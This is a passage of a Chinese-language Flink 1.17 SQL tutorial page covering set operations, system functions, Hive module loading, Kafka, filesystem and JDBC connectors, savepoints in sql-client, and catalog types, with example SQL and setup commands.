class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## UNION 和 UNION ALL</span></span><br><span class="line"><span class="comment"># UNION：将集合合并并且去重</span></span><br><span class="line"><span class="comment"># UNION ALL：将集合合并，不做去重</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws) <span class="keyword">UNION</span> (<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws1);</span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws) <span class="keyword">UNION</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws1);</span><br><span class="line"></span><br><span class="line"><span class="comment">## Intersect 和 Intersect All</span></span><br><span class="line"><span class="comment"># ntersect：交集并且去重</span></span><br><span class="line"><span class="comment"># Intersect ALL：交集不做去重</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws) <span class="keyword">INTERSECT</span> (<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws1);</span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws) <span class="keyword">INTERSECT</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws1);</span><br><span class="line"></span><br><span class="line"><span class="comment">## Except 和 Except All</span></span><br><span class="line"><span class="comment"># Except：差集并且去重</span></span><br><span class="line"><span class="comment"># Except ALL：差集不做去重</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws) <span class="keyword">EXCEPT</span> (<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws1);</span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws) <span class="keyword">EXCEPT</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws1);</span><br><span class="line"><span class="comment"># 上述 SQL 在流式任务中，如果一条左流数据先来了，没有从右流集合数据中找到对应的数据时会直接输出，当右流对应数据后续来了之后，会下发回撤流将之前的数据給撤回。这也是一个回撤流</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## In 子查询</span></span><br><span class="line"><span class="comment"># In 子查询的结果集只能有一列</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, vc</span><br><span class="line"><span class="keyword">FROM</span> ws</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span> <span class="keyword">IN</span> (</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> ws1</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 上述 SQL 的 In 子句和之前介绍到的 Inner Join 类似。并且 In 子查询也会涉及到大状态问题，要注意设置 State 的 TTL</span></span><br></pre></td></tr></table></figure><h3 id="5-14-系统函数">5.14 系统函数</h3><blockquote><p><a href="https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/dev/table/functions/systemfunctions/" target="_blank" rel="noopener" title="https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/dev/table/functions/systemfunctions/">https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/dev/table/functions/systemfunctions/</a></p></blockquote><p>系统函数（System Functions）也叫内置函数（Built-in Functions），是在系统中预先实现好的功能模块。我们可以通过固定的函数名直接调用，实现想要的转换操作。Flink SQL提供了大量的系统函数，几乎支持所有的标准SQL中的操作，这为我们使用SQL编写流处理程序提供了极大的方便。Flink SQL中的系统函数又主要可以分为两大类：<strong>标量函数（Scalar Functions）和聚合函数（Aggregate Functions）</strong>。</p><h4 id="标量函数（Scalar-Functions）">标量函数（Scalar Functions）</h4><p>标量函数指的就是只对输入数据做转换操作、返回一个值的函数。标量函数是最常见、也最简单的一类系统函数，数量非常庞大，很多在标准SQL中也有定义。所以我们这里只对一些常见类型列举部分函数，做一个简单概述，具体应用可以查看官网的完整函数列表</p><ul><li><strong>比较函数（Comparison Functions）</strong></li></ul><p>比较函数其实就是一个比较表达式，用来判断两个值之间的关系，返回一个布尔类型的值。这个比较表达式可以是用 &lt;、&gt;、= 等符号连接两个值，也可以是用关键字定义的某种判断。例如：</p><p>（1）value1 = value2 判断两个值相等；</p><p>（2）value1 &lt;&gt; value2 判断两个值不相等</p><p>（3）value IS NOT NULL 判断value不为空</p><ul><li><strong>逻辑函数（Logical Functions）</strong></li></ul><p>逻辑函数就是一个逻辑表达式，也就是用与（AND）、或（OR）、非（NOT）将布尔类型的值连接起来，也可以用判断语句（IS、IS NOT）进行真值判断；返回的还是一个布尔类型的值。例如：</p><p>（1）boolean1 OR boolean2 布尔值boolean1与布尔值boolean2取逻辑或</p><p>（2）boolean IS FALSE 判断布尔值boolean是否为false</p><p>（3）NOT boolean 布尔值boolean取逻辑非</p><ul><li><strong>算术函数（Arithmetic Functions）</strong></li></ul><p>进行算术计算的函数，包括用算术符号连接的运算，和复杂的数学运算。例如：</p><p>（1）numeric1 + numeric2 两数相加</p><p>（2）POWER(numeric1, numeric2) 幂运算，取数numeric1的numeric2次方</p><p>（3）RAND() 返回（0.0, 1.0）区间内的一个double类型的伪随机数</p><ul><li><strong>字符串函数（String Functions）</strong></li></ul><p>进行字符串处理的函数。例如：</p><p>（1）string1 || string2 两个字符串的连接</p><p>（2）UPPER(string) 将字符串string转为全部大写</p><p>（3）CHAR_LENGTH(string) 计算字符串string的长度</p><ul><li><strong>时间函数（Temporal Functions）</strong></li></ul><p>进行与时间相关操作的函数。例如：</p><p>（1）DATE string 按格式&quot;yyyy-MM-dd&quot;解析字符串string，返回类型为SQL Date</p><p>（2）TIMESTAMP string 按格式&quot;yyyy-MM-dd HH:mm:ss[.SSS]&quot;解析，返回类型为SQL timestamp</p><p>（3）CURRENT_TIME 返回本地时区的当前时间，类型为SQL time（与LOCALTIME等价）</p><p>（4）INTERVAL string range 返回一个时间间隔。</p><h4 id="聚合函数（Aggregate-Functions）">聚合函数（Aggregate Functions）</h4><p>聚合函数是以表中多个行作为输入，提取字段进行聚合操作的函数，会将唯一的聚合值作为结果返回。聚合函数应用非常广泛，不论分组聚合、窗口聚合还是开窗（Over）聚合，对数据的聚合操作都可以用相同的函数来定义。标准SQL中常见的聚合函数Flink SQL都是支持的，目前也在不断扩展，为流处理应用提供更强大的功能。例如：</p><p>（1）COUNT(*) 返回所有行的数量，统计个数。</p><p>（2）SUM([ ALL | DISTINCT ] expression) 对某个字段进行求和操作。默认情况下省略了关键字ALL，表示对所有行求和；如果指定DISTINCT，则会对数据进行去重，每个值只叠加一次。</p><p>（3）RANK() 返回当前值在一组值中的排名。</p><p>（4）ROW_NUMBER() 对一组值排序后，返回当前值的行号。</p><p>其中，RANK()和ROW_NUMBER()一般用在OVER窗口中。</p><h3 id="5-15-Module操作">5.15 Module操作</h3><p>目前 Flink 包含了以下三种 Module：</p><ul><li>CoreModule：CoreModule 是 Flink 内置的 Module，其包含了目前 Flink 内置的所有 UDF，Flink 默认开启的 Module 就是 CoreModule，我们可以直接使用其中的 UDF</li><li>HiveModule：HiveModule 可以将 Hive 内置函数作为 Flink 的系统函数提供给 SQL\Table API 用户进行使用，比如 get_json_object 这类 Hive 内置函数（Flink 默认的 CoreModule 是没有的）</li><li>用户自定义 Module：用户可以实现 Module 接口实现自己的 UDF 扩展 Module</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 使用 LOAD 子句去加载 Flink SQL 体系内置的或者用户自定义的 Module，UNLOAD 子句去卸载 Flink SQL 体系内置的或者用户自定义的 Module</span></span><br><span class="line"><span class="comment">-- 加载</span></span><br><span class="line"><span class="keyword">LOAD</span> <span class="keyword">MODULE</span> module_name [<span class="keyword">WITH</span> (<span class="string">'key1'</span> = <span class="string">'val1'</span>, <span class="string">'key2'</span> = <span class="string">'val2'</span>, ...)]</span><br><span class="line"><span class="comment">-- 卸载</span></span><br><span class="line">UNLOAD <span class="keyword">MODULE</span> module_name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"><span class="keyword">SHOW</span> MODULES;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">FULL</span> MODULES;</span><br></pre></td></tr></table></figure><p>在 Flink 中，Module 可以被 加载、启用 、禁用 、卸载 Module，当加载Module 之后，默认就是开启的。同时支持多个 Module 的，并且根据加载 Module 的顺序去按顺序查找和解析 UDF，先查到的先解析使用。此外，Flink 只会解析已经启用了的 Module。那么当两个 Module 中出现两个同名的函数且都启用时， Flink 会根据加载 Module 的顺序进行解析，结果就是会使用顺序为第一个的 Module 的 UDF，可以使用下面语法更改顺序：<code>USE MODULE hive,core;</code></p><p>USE是启用module，没有被use的为禁用（禁用不是卸载），除此之外还可以实现调整顺序的效果。上面的语句会将 Hive Module 设为第一个使用及解析的 Module。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 举例</span></span><br><span class="line"><span class="comment"># 加载官方已经提供的的 Hive Module，将 Hive 已有的内置函数作为 Flink 的内置函数。需要先引入 hive 的 connector。其中包含了 flink 官方提供的一个 HiveModule</span></span><br><span class="line"><span class="comment"># https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/hive/overview/</span></span><br><span class="line">wget https://repo.maven.apache.org/maven2/org/apache/flink/flink-sql-connector-hive-3.1.3_2.12/1.17.1/flink-sql-connector-hive-3.1.3_2.12-1.17.1.jar</span><br><span class="line">cp flink-sql-connector-hive-3.1.3_2.12-1.17.1.jar /opt/module/flink/lib/</span><br><span class="line"><span class="comment"># 注意：拷贝hadoop的包，解决依赖冲突问题</span></span><br><span class="line">cp /opt/module/hadoop-3.3.4/share/hadoop/mapreduce/hadoop-mapreduce-client-core-3.3.4.jar /opt/module/flink/lib/</span><br><span class="line"><span class="comment"># 重启flink集群和sql-client</span></span><br><span class="line"><span class="comment"># 启动Flink</span></span><br><span class="line">/opt/module/flink/bin/yarn-session.sh -d</span><br><span class="line"><span class="comment"># 启动Flink的sql-client</span></span><br><span class="line">/opt/module/flink/bin/sql-client.sh embedded -s yarn-session</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载hive module</span></span><br><span class="line"><span class="comment">-- hive-connector内置了hive module，提供了hive自带的系统函数</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">module</span> hive <span class="keyword">with</span> (<span class="string">'hive-version'</span>=<span class="string">'3.1.3'</span>);</span><br><span class="line"><span class="keyword">show</span> modules;</span><br><span class="line"><span class="keyword">show</span> functions;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 可以调用hive的split函数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">split</span>(<span class="string">'a,b'</span>, <span class="string">','</span>);</span><br></pre></td></tr></table></figure><h2 id="6、常用Connector读写">6、常用Connector读写</h2><blockquote><p>DataGen和Print都是一种connector，其他connector参考官网：<a href="https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/overview/" target="_blank" rel="noopener" title="https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/overview/">https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/overview/</a></p></blockquote><h3 id="6-1-Kafka">6.1 Kafka</h3><blockquote><p><a href="https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/kafka/" target="_blank" rel="noopener" title="https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/kafka/">https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/kafka/</a></p></blockquote><p>首先<strong>添加kafka连接器依赖</strong>，将flink-sql-connector-kafka-1.17.0.jar上传到flink的lib目录下，重启yarn-session、sql-client</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建Kafka的映射表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t1( </span><br><span class="line">  <span class="string">`event_time`</span> <span class="built_in">TIMESTAMP</span>(<span class="number">3</span>) METADATA <span class="keyword">FROM</span> <span class="string">'timestamp'</span>,</span><br><span class="line">  <span class="comment">--列名和元数据名一致可以省略 FROM 'xxxx', VIRTUAL表示只读</span></span><br><span class="line">  <span class="string">`partition`</span> <span class="built_in">BIGINT</span> METADATA <span class="keyword">VIRTUAL</span>,</span><br><span class="line">  <span class="string">`offset`</span> <span class="built_in">BIGINT</span> METADATA <span class="keyword">VIRTUAL</span>,</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>, </span><br><span class="line">ts <span class="built_in">bigint</span> , </span><br><span class="line">vc <span class="built_in">int</span> )</span><br><span class="line"><span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'kafka'</span>,</span><br><span class="line">  <span class="string">'properties.bootstrap.servers'</span> = <span class="string">'hadoop103:9092'</span>,</span><br><span class="line">  <span class="string">'properties.group.id'</span> = <span class="string">'atguigu'</span>,</span><br><span class="line"><span class="comment">-- 'earliest-offset', 'latest-offset', 'group-offsets', 'timestamp' and 'specific-offsets'</span></span><br><span class="line">  <span class="string">'scan.startup.mode'</span> = <span class="string">'earliest-offset'</span>,</span><br><span class="line">  <span class="comment">-- fixed为flink实现的分区器，一个并行度只写往kafka一个分区</span></span><br><span class="line"><span class="string">'sink.partitioner'</span> = <span class="string">'fixed'</span>,</span><br><span class="line">  <span class="string">'topic'</span> = <span class="string">'ws1'</span>,</span><br><span class="line">  <span class="string">'format'</span> = <span class="string">'json'</span></span><br><span class="line">) </span><br><span class="line"></span><br><span class="line"><span class="comment">## 插入Kafka表</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t1(<span class="keyword">id</span>,ts,vc) <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">source</span></span><br><span class="line"><span class="comment">## 查询Kafka表</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t1</span><br></pre></td></tr></table></figure><p><strong>upsert-kafka表</strong></p><p>如果当前表存在更新操作，那么普通的kafka连接器将无法满足，此时可以使用Upsert Kafka连接器。Upsert Kafka 连接器支持以 upsert 方式从 Kafka topic 中读取数据并将数据写入 Kafka topic。</p><p>作为 source，upsert-kafka 连接器生产 changelog 流，其中每条数据记录代表一个更新或删除事件。更准确地说，数据记录中的 value 被解释为同一 key 的最后一个 value 的 UPDATE，如果有这个 key（如果不存在相应的 key，则该更新被视为 INSERT）。用表来类比，changelog 流中的数据记录被解释为 UPSERT，也称为 INSERT/UPDATE，因为任何具有相同 key 的现有行都被覆盖。另外，value 为空的消息将会被视作为 DELETE 消息。</p><p>作为 sink，upsert-kafka 连接器可以消费 changelog 流。它会将 INSERT/UPDATE_AFTER 数据作为正常的 Kafka 消息写入，并将 DELETE 数据以 value 为空的 Kafka 消息写入（表示对应 key 的消息被删除）。Flink 将根据主键列的值对数据进行分区，从而保证主键上的消息有序，因此同一主键上的更新/删除消息将落在同一分区中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建upsert-kafka的映射表(必须定义主键)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t2( </span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span> , </span><br><span class="line">    sumVC <span class="built_in">int</span> ,</span><br><span class="line">    primary <span class="keyword">key</span> (<span class="keyword">id</span>) <span class="keyword">NOT</span> <span class="keyword">ENFORCED</span> </span><br><span class="line">)</span><br><span class="line"><span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'upsert-kafka'</span>,</span><br><span class="line">  <span class="string">'properties.bootstrap.servers'</span> = <span class="string">'hadoop102:9092'</span>,</span><br><span class="line">  <span class="string">'topic'</span> = <span class="string">'ws2'</span>,</span><br><span class="line">  <span class="string">'key.format'</span> = <span class="string">'json'</span>,</span><br><span class="line">  <span class="string">'value.format'</span> = <span class="string">'json'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入upsert-kafka表</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2 <span class="keyword">select</span>  <span class="keyword">id</span>,<span class="keyword">sum</span>(vc) sumVC  <span class="keyword">from</span> <span class="keyword">source</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询upsert-kafka表</span></span><br><span class="line"><span class="comment"># upsert-kafka 无法从指定的偏移量读取，只会从主题的源读取。如此，才知道整个数据的更新过程。并且通过 -U，+U，+I 等符号来显示数据的变化过程</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t2</span><br></pre></td></tr></table></figure><h3 id="6-2-File">6.2 File</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建FileSystem映射表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t3( <span class="keyword">id</span> <span class="built_in">int</span>, ts <span class="built_in">bigint</span> , vc <span class="built_in">int</span> )</span><br><span class="line"><span class="keyword">WITH</span> (</span><br><span class="line">  <span class="string">'connector'</span> = <span class="string">'filesystem'</span>,</span><br><span class="line">  <span class="string">'path'</span> = <span class="string">'hdfs://hadoop102:8020/data/t3'</span>,</span><br><span class="line">  <span class="string">'format'</span> = <span class="string">'csv'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 写入</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t3 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">source</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 查询</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t3 <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1</span></span><br><span class="line"><span class="string"># 如果报错java.lang.classNotFoundException: org.apache.f1ink.table.planner.delegation.DialectFactory</span></span><br><span class="line"><span class="string"># 因为之前lib下放了sql-hive的连接器jar包，解决方案有两种</span></span><br><span class="line"><span class="string"># 将hive的连接器jar包挪走，重启yarn-session、sql-client</span></span><br><span class="line"><span class="string"># 和之前操作类似替换planner的jar包</span></span><br></pre></td></tr></table></figure><h3 id="6-3-JDBC（MySQL）">6.3 JDBC（MySQL）</h3><p>Flink在将数据写入外部数据库时使用DDL中定义的主键。<strong>如果定义了主键，则连接器以upsert模式操作</strong>，否则，连接器以追加模式操作。</p><p>在upsert模式下，Flink会根据主键插入新行或更新现有行，Flink这样可以保证幂等性。为了保证输出结果符合预期，建议为表定义主键，并确保主键是底层数据库表的唯一键集或主键之一。在追加模式下，Flink将所有记录解释为INSERT消息，如果底层数据库中发生了主键或唯一约束违反，则INSERT操作可能会失败</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql的test库中建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`ws2`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`ts`</span> <span class="built_in">bigint</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`vc`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br></pre></td></tr></table></figure><p>添加JDBC连接器依赖，上传jdbc连接器的jar包和mysql的连接驱动包到flink/lib下：</p><ul><li>flink-connector-jdbc-1.17.jar</li><li>mysql-connector-j-8.0.31.jar</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建JDBC映射表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t4</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">id</span>                      <span class="built_in">INT</span>,</span><br><span class="line">    ts                   <span class="built_in">BIGINT</span>,</span><br><span class="line">vc                     <span class="built_in">INT</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="keyword">id</span>) <span class="keyword">NOT</span> <span class="keyword">ENFORCED</span></span><br><span class="line">) <span class="keyword">WITH</span> (</span><br><span class="line">    <span class="string">'connector'</span>=<span class="string">'jdbc'</span>,</span><br><span class="line">    <span class="string">'url'</span> = <span class="string">'jdbc:mysql://hadoop102:3306/test?useUnicode=true&amp;characterEncoding=UTF-8'</span>,</span><br><span class="line">    <span class="string">'username'</span> = <span class="string">'root'</span>,</span><br><span class="line">    <span class="string">'password'</span> = <span class="string">'000000'</span>,</span><br><span class="line">    <span class="string">'connection.max-retry-timeout'</span> = <span class="string">'60s'</span>,</span><br><span class="line">    <span class="string">'table-name'</span> = <span class="string">'ws2'</span>,</span><br><span class="line">    <span class="string">'sink.buffer-flush.max-rows'</span> = <span class="string">'500'</span>,</span><br><span class="line">    <span class="string">'sink.buffer-flush.interval'</span> = <span class="string">'5s'</span>,</span><br><span class="line">    <span class="string">'sink.max-retries'</span> = <span class="string">'3'</span>,</span><br><span class="line">    <span class="string">'sink.parallelism'</span> = <span class="string">'1'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t4 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">source</span></span><br></pre></td></tr></table></figure><h2 id="7、sql-client-中使用-savepoint">7、sql-client 中使用 savepoint</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 提交一个insert作业，可以给作业设置名称</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sink <span class="keyword">select</span>  * <span class="keyword">from</span> <span class="keyword">source</span>;</span><br><span class="line"><span class="comment">## 查看job列表</span></span><br><span class="line"><span class="keyword">SHOW</span> JOBS;</span><br><span class="line"><span class="comment">## 停止作业，触发savepoint</span></span><br><span class="line"><span class="keyword">SET</span> state.checkpoints.dir=<span class="string">'hdfs://hadoop102:8020/chk'</span>;</span><br><span class="line"><span class="keyword">SET</span> state.savepoints.dir=<span class="string">'hdfs://hadoop102:8020/sp'</span>;</span><br><span class="line"><span class="keyword">STOP</span> JOB <span class="string">'228d70913eab60dda85c5e7f78b5782c'</span> <span class="keyword">WITH</span> <span class="keyword">SAVEPOINT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 从savepoint恢复</span></span><br><span class="line"><span class="comment">-- 设置从savepoint恢复的路径 </span></span><br><span class="line"><span class="keyword">SET</span> execution.savepoint.path=<span class="string">'hdfs://hadoop102:8020/sp/savepoint-37f5e6-0013a2874f0a'</span>;  </span><br><span class="line"><span class="comment">-- 之后直接提交sql，就会从savepoint恢复</span></span><br><span class="line"><span class="comment">--允许跳过无法还原的保存点状态</span></span><br><span class="line"><span class="keyword">set</span> <span class="string">'execution.savepoint.ignore-unclaimed-state'</span> = <span class="string">'true'</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">## 恢复后重置路径</span></span><br><span class="line"><span class="comment"># 指定execution.savepoint.path后，将影响后面执行的所有DML语句，可以使用RESET命令重置这个配置选项</span></span><br><span class="line"><span class="keyword">RESET</span> execution.savepoint.path;</span><br><span class="line"><span class="comment"># 如果出现reset没生效的问题，可能是个bug，我们可以退出sql-client，再重新进，不需要重启flink的集群。</span></span><br></pre></td></tr></table></figure><h2 id="8、Catalog">8、Catalog</h2><p>Catalog 提供了元数据信息，例如数据库、表、分区、视图以及数据库或其他外部系统中存储的函数和信息。数据处理最关键的方面之一是管理元数据。元数据可以是临时的，例如临时表、UDF。 元数据也可以是持久化的，例如 Hive MetaStore 中的元数据。Catalog 提供了一个统一的API，用于管理元数据，并使其可以从 Table API 和 SQL 查询语句中来访问。</p><p>Catalog 允许用户引用其数据存储系统中现有的元数据，并自动将其映射到 Flink 的相应元数据。例如，Flink 可以直接使用 Hive MetaStore 中的表的元数据，不必在Flink中手动重写ddl，也可以将 Flink SQL 中的元数据存储到 Hive MetaStore 中。Catalog 极大地简化了用户开始使用 Flink 的步骤，并极大地提升了用户体验</p><h3 id="8-1-Catalog类型">8.1 Catalog类型</h3><ul><li>GenericInMemoryCatalog：基于内存实现的 Catalog，所有元数据只在session 的生命周期（即一个 Flink 任务一次运行生命周期内）内可用。默认自动创建，会有名为“default_catalog”的内存Catalog，这个Catalog默认只有一个名为“default_database”的数据库。</li><li>JdbcCatalog：JdbcCatalog 使得用户可以将 Flink 通过 JDBC 协议连接到关系数据库。Postgres Catalog和MySQL Catalog是目前仅有的两种JDBC Catalog实现，将元数据存储在数据库中。</li><li>HiveCatalog：有两个用途，一是单纯作为 Flink 元数据的持久化存储，二是作为读写现有 Hive 元数据的接口。注意：Hive MetaStore 以小写形式存储所有元数据对象名称。Hive Metastore以小写形式存储所有元对象名称，而 GenericInMemoryCatalog会区分大小写。</li><li>用户自定义 Catalog：用户可以实现 Catalog 接口实现自定义 Catalog。从Flink1.16开始引入了用户类加载器，通过CatalogFactory.Context#getClassLoader访问，否则会报错ClassNotFoundException</li></ul><h3 id="8-2-JdbcCatalog（MySQL）">8.2 JdbcCatalog（MySQL）</h3><p>JdbcCatalog不支持建表，只是打通flink与mysql的连接，可以去读写mysql现有的库表，然后需要把1.17的jdbc包放到对应目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 